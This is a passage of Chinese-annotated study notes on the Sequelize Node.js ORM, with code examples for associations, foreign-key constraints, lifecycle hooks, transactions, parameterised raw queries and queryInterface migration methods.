		unique: false
	},
	foreignKey: 'tag_id'
});


也可以指定别名, 或用scope限制tag的要求
Post.hasMany(Tag, {
	through: {
		model: ItemTag,
		unique: false,
		scope: {
			taggable: 'post'
		}
	},
	scope: {
		status: 'pending'

	},
	as: 'pendingTags',
	foreignKey: 'taggable_id',
	constraints: false
});

Post.getPendingTags();
//constraints: false的意思是,taggable_id不能直接作为查询getTaggable()这样来获取model，因为他有可能是有很多其他类型的


//Naming strategy 命名策略

通常hasMany(User) 的类，会添加addUser setUser getUser这种方法, 可以用as去改变名称, 在单向例如hasOne 和 belongsTo的时候，as后面应该是单数，其他应该是复数，都跟rails一样啦。Sequelize有用一个叫 inflection 的库去处理单复数这些名字转换, 可以自由指定单复数，这样写

User.belongsToMany(Project, { as: { singular: 'task', plural: 'tasks'  } })

要注意的是，用了as，通常foreign_key也会变，最好自己显式指定一下
所以像Invoice.belongsTo(Subscription, { as: 'TheSubscription'  })这种，sequelize会自动创建subscription_id和the_subscription_id,因为还没智能到知道你要找那个外键，所以记住，用as就要设外键，和rails一样

//每次改完Association, 都要跑一次Sequelize.sync

//Assciation Object, 关联实例的一些方便用法

Project.belongsToMany(Task)
Task.belongsToMany(Project)

Project.create()...
Task.create()...
Task.create()...

// save them... and then: 直接给多个数组
project.setTasks([task1, task2]).then(function() {
	// saved!
})

// ok, now they are saved... how do I get them later on? //返回数组
project.getTasks().then(function(associatedTasks) {
	// associatedTasks is an array of tasks
})

// You can also pass filters to the getter method.
// They are equal to the options you can pass to a usual finder method. 条件查询
project.getTasks({ where: 'id > 10'  }).then(function(tasks) {
	// tasks with an id greater than 10 :)
})

// You can also only retrieve certain fields of a associated object. 只拿task的title和id
project.getTasks({attributes: ['title']}).then(function(tasks) {
	// retrieve tasks with the attributes "title" and "id"
})

// remove the association with task1
project.setTasks([task2]).then(function(associatedTasks) { //关联只留下task2
	// you will get task2 only
})

// remove 'em all
project.setTasks([]).then(function(associatedTasks) { //把所有关联去掉
	// you will get an empty array
})

// or remove 'em more directly
project.removeTask(task1).then(function() { //删除task1
	// it's gone
})

// and add 'em again
project.addTask(task1).then(function() { //把task1又加回来
	// it's back again
})

//project is associated with task1 and task2 反过来也行
task2.setProject(null).then(function() {
	// and it's gone
})

//中间表join table也可以指定只拿某些属性
//This will select only name from the Projects table, and only status from the UserProjects table
user.getProjects({ attributes: ['name'], joinTableAttributes: ['status'] })

//有has方法去检查是否有关联
// check if an object is one of associated ones:
Project.create({ /* */  }).then(function(project) {
	return User.create({ /* */  }).then(function(user) {
		return project.hasUser(user).then(function(result) {
			// result would be false
			return project.addUser(user).then(function() {
				return project.hasUser(user).then(function(result) {
					// result would be true
				})
			})
		})
	})
})

// check if all associated objects are as expected:
// let's assume we have already a project and two users
project.setUsers([user1, user2]).then(function() {
	return project.hasUsers([user1]);
}).then(function(result) {
	// result would be false
	return project.hasUsers([user1, user2]);
}).then(function(result) {
	// result would be true
})


//ForeignKey相关
var Task = this.sequelize.define('task', { title: Sequelize.STRING  })
  , User = this.sequelize.define('user', { username: Sequelize.STRING  })
 
User.hasMany(Task)
Task.belongsTo(User)
//不特别指定的时候, 默认会帮task创建user_id
这是创建的语句
CREATE TABLE IF NOT EXISTS `User` (
	`id` INTEGER PRIMARY KEY,
	`username` VARCHAR(255)
);

CREATE TABLE IF NOT EXISTS `Task` (
	`id` INTEGER PRIMARY KEY,
	`title` VARCHAR(255),
	`user_id` INTEGER REFERENCES `User` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
);

user_id是外键的时候，关联的user删除或者干嘛会自动变回null,看sql语句就知道了。hasOne和hasMany都是。cascade的意思是1:1 1:m的情况下user更新id这边user_id也会跟着变, 如果n:m的情况, 例如 user belongsToMany tags, 如果user删了，对应的中间表TagUser里的记录也会删除。默认的情况下1:1 1:m就是上面这种删除是set null, update cascade。 n:m的情况下就是删除 和 更新都是cascade

设定constraints约束的意思是,创建表的时候一定要按照绝对的顺序。如果Task依赖User的user_id，就必须先创建User再创建Task表, 这个有时会造成环状无限调用的问题

像这种
var Document = this.sequelize.define('document', {
	author: Sequelize.STRING

})
, Version = this.sequelize.define('version', {
	timestamp: Sequelize.DATE
})

Document.hasMany(Version) // This adds document_id to version
Document.belongsTo(Version, { as: 'Current', foreignKey: 'current_version_id' }) // This adds current_version_id to document

这样就会报错,因为version属于document, 同时又拥有一个currentDocument
  Cyclic dependency found. 'Document' is dependent of itself. Dependency Chain: Document -> Version => Document

这种情况就要把constraints设为false
Document.hasMany(Version)
Document.belongsTo(Version, { as: 'Current', foreignKey: 'current_version_id', constraints: false })

这样sync table的时候
CREATE TABLE IF NOT EXISTS `Document` (
	`id` INTEGER PRIMARY KEY,
	`author` VARCHAR(255),
	`current_version_id` INTEGER

);
CREATE TABLE IF NOT EXISTS `Version` (
	`id` INTEGER PRIMARY KEY,
	`timestamp` DATETIME,
	`document_id` INTEGER REFERENCES `Document` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
);

//强制指定foreign_key 引用时不带constraints

var Series, Trainer, Video
 
// Series has a trainer_id=Trainer.id foreign reference key after we call Trainer.hasMany(series)
Series = sequelize.define('series', {
	title:        DataTypes.STRING,
	sub_title:    DataTypes.STRING,
	description:  DataTypes.TEXT,

	// Set FK relationship (hasMany) with `Trainer`
	trainer_id: {
		type: DataTypes.INTEGER,
		references: {
			model: "trainers", //可以写表名String, 又可以写类名 model
			key: "id"
		}
	}
})

Trainer = sequelize.define('trainer', {
	first_name: DataTypes.STRING,
	last_name:  DataTypes.STRING
});

// Video has a series_id=Series.id foreign reference key after we call Series.hasOne(Video)...
Video = sequelize.define('video', {
	title:        DataTypes.STRING,
	sequence:     DataTypes.INTEGER,
	description:  DataTypes.TEXT,

	// set relationship (hasOne) with `Series`
	series_id: {
		type: DataTypes.INTEGER,
		references: {
			model: Series, // Can be both a string representing the table name, or a reference to the model
			key:   "id"
		}
	}
});

Series.hasOne(Video);
Trainer.hasMany(Series);


//Association Creating
var Product = this.sequelize.define('product', {
	title: Sequelize.STRING

});
var User = this.sequelize.define('user', {
	first_name: Sequelize.STRING,
	last_name: Sequelize.STRING

});

Product.belongsTo(User);
// Also works for `hasOne`

这样就可以同时创建Product和User,并让他们关联
return Product.create({
	title: 'Chair',
	user: {
		first_name: 'Mick',
		last_name: 'Broadstone'
	}
}, {
	include: [ User  ]
});

as的情况
var Creator = Product.belongsTo(User, {as: 'creator'});

return Product.create({
	title: 'Chair',
	creator: {
		first_name: 'Matt',
		last_name: 'Hansen'
	}
}, {
	include: [ Creator  ]
});

var Tag = this.sequelize.define('tag', {
    name: Sequelize.STRING

});

//看看many的情况
Product.hasMany(Tag);
// Also works for `belongsToMany`.

Product.create({
	id: 1,
	title: 'Chair',
	tags: [ //同时创建多个
		{ name: 'Alpha' },
		{ name: 'Beta' }
	]
}, {
	include: [ Tag  ]
})

as也一样
var Categories = Product.hasMany(Tag, {as: 'categories'});

Product.create({
	id: 1,
	title: 'Chair',
	categories: [
		{id: 1, name: 'Alpha'},
		{id: 2, name: 'Beta'}
	]
}, {
	include: [{
		model: Categories,
		as: 'categories'
	}]
})

--------------------------------------------------
9) callback hook, 各种after before的钩子吧

有这些钩子,按顺序
(1)
  beforeBulkCreate(instances, options, fn)
  beforeBulkDestroy(options, fn)
  beforeBulkUpdate(options, fn)
(2)
  beforeValidate(instance, options, fn)
(-)
  validate
(3)
  afterValidate(instance, options, fn)
  - or -
    validationFailed(instance, options, error, fn)
(4)
  beforeCreate(instance, options, fn)
  beforeDestroy(instance, options, fn)
  beforeUpdate(instance, options, fn)
(-)
  create
  destroy
  update
(5)
  afterCreate(instance, options, fn)
  afterDestroy(instance, options, fn)
  afterUpdate(instance, options, fn)
(6)
  afterBulkCreate(instances, options, fn)
  afterBulkDestroy(options, fn)
  afterBulkUpdate(options, fn)

加钩子的三种写法
// Method 1 via the .define() method
var User = sequelize.define('user', {
	username: DataTypes.STRING,
	mood: {
		type: DataTypes.ENUM, //enum的写法 !!!!!
		values: ['happy', 'sad', 'neutral']
	}
}, {
	hooks: {
		beforeValidate: function(user, options) {
			user.mood = 'happy'
		},
		afterValidate: function(user, options) {
			user.username = 'Toni'
		}
	}
})

// Method 2 via the .hook() method
User.hook('beforeValidate', function(user, options) {
	user.mood = 'happy'
})

User.hook('afterValidate', function(user, options) {
	return sequelize.Promise.reject("I'm afraid I can't let you do that!")
})

// Method 3 via the direct method
User.beforeCreate(function(user, options) {
	return hashPassword(user.password).then(function (hashedPw) {
		user.password = hashedPw;
	});
})

User.afterValidate('myHookAfter', function(user, options, fn) {
	user.username = 'Toni'
})


删除hook, 不知道有什么用
var Book = sequelize.define('book', {
    title: DataTypes.STRING
})

Book.addHook('afterCreate', 'notifyUsers', function(book, options) {
	//
})

Book.removeHook('afterCreate', 'notifyUsers')



全局default hook，所有model都会继承
var sequelize = new Sequelize(..., {
  define: {
    hooks: {
      beforeCreate: function () {
        //             
      }
    }
  }
});


但是default全局hook会被model的单个hook给覆盖...
var User = sequelize.define('user');
var Project = sequelize.define('project', {}, {
  hooks: {
    beforeCreate: function () {
      //         
    }
  }
});

User.create() // Runs the global hook
Project.create() // Runs its own hook (because the global hook is overwritten)

全局持久premanent hook ,这种model有否定义beforeCreate都会执行
sequelize.addHook('beforeCreate', function () {
  // Do stuff
});

要注意是local hook永远会在global hook之前执行


//Instane Hook
以下这些hook当你在修改一个model时无论如何都会跑
beforeValidate
afterValidate or validationFailed
beforeCreate / beforeUpdate  / beforeDestroy
afterCreate / afterUpdate / afterDestroy

//Example
// ...define ...
User.beforeCreate(function(user) {
  if (user.accessLevel > 10 && user.username !== "Boss") {
    throw new Error("You can't grant this user an access level above 10!")
  }
})

User.create({username: 'Not a Boss', accessLevel: 20}).catch(function(err) {
  console.log(err) // You can't grant this user an access level above 10! 报错
})

//Model Class层面的hook , 例如操作bulkCreate, updaet , destroy批量处理一批数据的时候
这些hook都会执行
beforeBulkCreate / beforeBulkUpdate / beforeBulkDestroy
afterBulkCreate / afterBulkUpdate / afterBulkDestroy

如果想中间影响到的每个model都执行一次自己的callback, individualHooks: true 设这个
Model.destroy({ where: {accessLevel: 0}, individualHooks: true})
// Will select all records that are about to be deleted and emit before- + after- Destroy on each instance

Model.update({username: 'Toni'}, { where: {accessLevel: 0}, individualHooks: true})
// Will select all records that are about to be updated and emit before- + after- Update on each instance

根据类型不一样，可能给到hook的参数会不同, 这个限制得比较死，避免使用，Example
Model.beforeBulkCreate(function(records, fields) {
  // records = the first argument sent to .bulkCreate
  // fields = the second argument sent to .bulkCreate
})

Model.bulkCreate([
  {username: 'Toni'}, // part of records argument
  {username: 'Tobi'} // part of records argument
], ['username'] /* part of fields argument */)

Model.beforeBulkUpdate(function(attributes, where) {
  // attributes = first argument sent to Model.update
  // where = second argument sent to Model.update
})

Model.update({gender: 'Male'} /*attributes argument*/, { where: {username: 'Tom'}} /*where argument*/)

Model.beforeBulkDestroy(function(whereClause) {
  // whereClause = first argument sent to Model.destroy
})

Model.destroy({ where: {username: 'Tom'}} /*whereClause argument*/)

//updatesOnDuplicate
// Bulk updating existing users with updatesOnDuplicate option
Users.bulkCreate([{ id: 1, isMemeber: true}, 
                 { id: 2, isMember: false}], 
                 { updatesOnDuplicate: ['isMember']})

User.beforeBulkCreate(function (users, options) {
  users.forEach(function (user) {
    if (user.isMember) {
      user.memberSince = new Date()
    }
  })

  // Add memberSince to updatesOnDuplicate otherwise the memberSince date wont be
  // saved to the database
  options.updatesOnDuplicate.push('memberSince')
})

//association hook
关联状态的时候, add/set会调起关联model的 beforeUpdate/afterUpdate, 但是不会自动调用 beforeDestroy afterDestroy, 除非加上onDelete: 'cascade' 和 hooks: true
var Projects = sequelize.define('projects', {
  title: DataTypes.STRING
})

var Tasks = sequelize.define('tasks', {
  title: DataTypes.STRING
})

Projects.hasMany(Tasks, { onDelete: 'cascade', hooks: true })
Tasks.belongsTo(Projects)

然后会有如下url
DELETE FROM `table` WHERE associatedIdentifier = associatedIdentifier.primaryKey

如果加了hooks: true之后，优先跑的是bulk的hook， 如果要一条条跑，remove里加参数{individualHooks: true}, 会先把一条条关联model查出来，删除跑hook


//transaction相关的hook
// Here we use the promise-style of async hooks rather than
// the callback.
User.hook('afterCreate', function(user, options) {
  // 'transaction' will be available in options.transaction

  // This operation will be part of the same transaction as the
  // original User.create call.
  return User.update({
    mood: 'sad'
  }, {
    where: {
      id: user.id
    },
    transaction: options.transaction //这里的options.transaction就是下面t传递过来的transaction
  });
});


sequelize.transaction(function(t) {
  User.create({
    username: 'someguy',
    mood: 'happy',
    transaction: t //这里会把transaction传递下去
  });
});

这些要注意的是，如果上面的User.update不把transaction参数设好，会变成什么操作都没有

要注意官方推荐，在hook里如果要改到一些需要持久化数据的时候, always add  { transaction: options.transaction }
--------------------------------------------------
9) transaction
用sequelize.transaction去包装一笔事务，不需要显式的调t.commit() 或 t.rollback，只要事务里的各种promise都resolve就会自动commit

return sequelize.transaction(function (t) {

  // chain all your queries here. make sure you return them.
  return User.create({
    firstName: 'Abraham',
    lastName: 'Lincoln'
  }, {transaction: t}).then(function (user) {
    return user.setShooter({
      firstName: 'John',
      lastName: 'Boothe'
    }, {transaction: t});
  });

}).then(function (result) {
  // Transaction has been committed
  // result is whatever the result of the promise chain returned to the transaction callback
}).catch(function (err) {
  // Transaction has been rolled back
  // err is whatever rejected the promise chain returned to the transaction callback
});

如果不想每次显式存 transaction: t的参数，可以装cls
var cls = require('continuation-local-storage'),
namespace = cls.createNamespace('my-very-own-namespace'); //配好namespace

var Sequelize = require('sequelize');
Sequelize.cls = namespace;

new Sequelize(....); //这样下面的代码都不用写，感觉没鸟用

可以用嵌套的方式控制并发时使用分离的事务
sequelize.transaction(function (t1) {
  return sequelize.transaction(function (t2) {
    // With CLS enable, queries here will by default use t2
    // Pass in the `transaction` option to define/alter the transaction they belong to.
    return Promise.all([
        User.create({ name: 'Bob' }, { transaction: null }),
        User.create({ name: 'Mallory' }, { transaction: t1 }),
        User.create({ name: 'John' }) // this would default to t2 有cls的话这里用的默认t2
    ]);
  });
});

可以指定事务类型，有如下选项
Sequelize.Transaction.ISOLATION_LEVELS.READ_UNCOMMITTED // "READ UNCOMMITTED"
Sequelize.Transaction.ISOLATION_LEVELS.READ_COMMITTED // "READ COMMITTED"
Sequelize.Transaction.ISOLATION_LEVELS.REPEATABLE_READ  // "REPEATABLE READ" //默认
Sequelize.Transaction.ISOLATION_LEVELS.SERIALIZABLE // "SERIALIZABLE"

使用
return sequelize.transaction({
  isolationLevel: Sequelize.Transaction.ISOLATION_LEVELS.SERIALIZABLE
  }, function (t) {

});

Unmanaged Transaction, 这东西是这事务一定要commit或rollback，不然就hang住等到超时报错

return sequelize.transaction().then(function (t) { //这样用，在then里的方法用
  return User.create({
    firstName: 'Homer',
    lastName: 'Simpson'
  }, {transaction: t}).then(function (user) {
    return user.addSibling({
      firstName: 'Lisa',
      lastName: 'Simpson'
    }, {transaction: t});
  }).then(function () {
    return t.commit(); //要显式地去commit
  }).catch(function (err) {
    return t.rollback();//或rollback
  });
});


Transaction的Options, 第一个参数是可以传很多东西配置
例如, sequelize({..options}, function(t){ .. }), options里
{
  autocommit: true,
  isolationLevel: 'REPEATABLE_READ',
  deferrable: 'NOT DEFERRABLE' // implicit default of postgres
}

--------------------------------------------------
10) Raw Query，直接执行sql
sequelize.query("UPDATE users SET y = 42 WHERE x = 12").spread(function(results, metadata) {
  // Results will be an empty array and metadata will contain the number of affected rows.
})

sequelize.query("SELECT * FROM `users`", { type: sequelize.QueryTypes.SELECT})
  .then(function(users) {
    // We don't need spread here, since only the results will be returned for select queries
  })

// Callee is the model definition. This allows you to easily map a query to a predefined model 指定model的方式
sequelize.query('SELECT * FROM projects', { model: Projects }).then(function(projects){
  // Each record will now be a instance of Project
})

//replacement 防注入
sequelize.query('SELECT * FROM projects WHERE status = ?',
  { replacements: ['active'], type: sequelize.QueryTypes.SELECT }
).then(function(projects) {
  console.log(projects)
})

sequelize.query('SELECT * FROM projects WHERE status = :status ',
  { replacements: { status: 'active' }, type: sequelize.QueryTypes.SELECT }
).then(function(projects) {
  console.log(projects)
})

sequelize.query('SELECT *, "text with literal $$1 and literal $$status" as t FROM projects WHERE status = $1',
  { bind: ['active'], type: sequelize.QueryTypes.SELECT }
).then(function(projects) {
  console.log(projects)
})

sequelize.query('SELECT *, "text with literal $$1 and literal $$status" as t FROM projects WHERE status = $status',
  { bind: { status: 'active' }, type: sequelize.QueryTypes.SELECT }
).then(function(projects) {
  console.log(projects)
})

--------------------------------------------------
11) Migration !
sequelize-cli提供如下命令(egg下用egg-sequelize), yarn run egg-sequelize

$ sequelize db:migrate        # Run pending migrations.
$ sequelize db:migrate:undo   # Revert the last migration run.
$ sequelize help              # Display this help text.
$ sequelize init              # Initializes the project.
$ sequelize migration:create  # Generates a new migration file.
$ sequelize version           # Prints the version number.

用help可以看到更详细的用法
$ sequelize help:init
$ sequelize help:db:migrate
$ sequelize help:db:migrate:undo

#skeleton
所有migrations文件都要放在项目根目录migrations

//一般文件结构
module.exports = {
  up: function(queryInterface, Sequelize) {
    // logic for transforming into the new state
  },
 
  down: function(queryInterface, Sequelize) {
    // logic for reverting the changes
  }
}

queryInterface是可以用来修改数据库的, Sequelize参数里面包含STRING啊INTEGER之类的类型,up down返回promise

module.exports = {
  up: function(queryInterface, Sequelize) {
    return queryInterface.dropAllTables(); //......删所有的table
  }
}

## createTable, 第二个参数跟在model里定义一撚样

queryInterface.createTable(
  'nameOfTheNewTable',
  {
    id: {
      type: Sequelize.INTEGER,
      primaryKey: true,
      autoIncrement: true
    },
    createdAt: {
      type: Sequelize.DATE
    },
    updatedAt: {
      type: Sequelize.DATE
    },
    attr1: Sequelize.STRING,
    attr2: Sequelize.INTEGER,
    attr3: {
      type: Sequelize.BOOLEAN,
      defaultValue: false,
      allowNull: false
    },
    //foreign key usage
    attr4: {
        type: Sequelize.INTEGER,
        references: {
            model: 'another_table_name',
            key: 'id'
        },
        onUpdate: 'cascade',
        onDelete: 'cascade'
    }
  },
  {
    engine: 'MYISAM', // default: 'InnoDB'
    charset: 'latin1' // default: null
  }
)

## dropTable(tableName, options)
queryInterface.dropTable('nameOfTheExistingTable')

## dropAllTables(options) 用来都是傻的

## renameTable(before, after, options)

## showAllTables(options) 用在migration文件?? excuse me?
queryInterface.showAllTables().then(function(tableNames) {})

## describeTable(tableName, options) 会返回这个table的所有信息

queryInterface.describeTable('Person').then(function(attributes) {
  /*
    attributes will be something like:
 
    {
      name: {
        type:         'VARCHAR(255)', // this will be 'CHARACTER VARYING' for pg!
        allowNull:    true,
        defaultValue: null
      },
      isBetaMember: {
        type:         'TINYINT(1)', // this will be 'BOOLEAN' for pg!
        allowNull:    false,
        defaultValue: false
      }
    }
  */
})


## addColumn(tableName, attributeName, dataTypeOrOptions, options) 这个常用增加列

queryInterface.addColumn(
  'nameOfAnExistingTable',
  'nameOfTheNewAttribute',
  Sequelize.STRING
)
 
// or
 
queryInterface.addColumn(
  'nameOfAnExistingTable',
  'nameOfTheNewAttribute',
  {
    type: Sequelize.STRING,
    allowNull: false
  }
)

## removeColumn(tableName, attributeName, options) 删除列
queryInterface.removeColumn('Person', 'signature')

## changeColumn(tableName, attributeName, dataTypeOrOptions, options) 这个重要 ,注意要完整描述好新类型
queryInterface.changeColumn(
  'nameOfAnExistingTable',
  'nameOfAnExistingAttribute',
  {
    type: Sequelize.FLOAT,
    allowNull: false,
    defaultValue: 0.0
  }
)

## renameColumn(tableName, attrNameBefore, attrNameAfter, options)
queryInterface.renameColumn('Person', 'signature', 'sig') 

## addIndex(tableName, attributes, options)
// This example will create the index person_firstname_lastname
queryInterface.addIndex('Person', ['firstname', 'lastname'])

// This example will create a unique index with the name SuperDuperIndex using the optional 'options' field.
// Possible options:
// - indicesType: UNIQUE|FULLTEXT|SPATIAL
// - indexName: The name of the index. Default is __
// - parser: For FULLTEXT columns set your parser
// - indexType: Set a type for the index, e.g. BTREE. See the documentation of the used dialect
// - logging: A function that receives the sql query, e.g. console.log
queryInterface.addIndex(
  'Person',
  ['firstname', 'lastname'],
  {
    indexName: 'SuperDuperIndex',
    indicesType: 'UNIQUE'
  }
)

## removeIndex(tableName, indexNameOrAttributes, options)
queryInterface.removeIndex('Person', 'SuperDuperIndex')
// or
queryInterface.removeIndex('Person', ['firstname', 'lastname'])
